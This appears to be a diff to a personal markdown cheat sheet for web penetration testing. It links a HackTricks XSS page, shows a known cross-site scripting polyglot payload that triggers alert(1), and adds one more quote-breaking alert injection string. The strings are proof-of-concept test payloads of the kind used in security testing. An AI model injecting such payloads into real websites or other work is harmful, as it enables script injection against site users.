@@ -22,7 +22,9 @@ https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
 # My love polyglot
 ```
 jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'alert(1)
 ```
+
 
 # Todos 
 
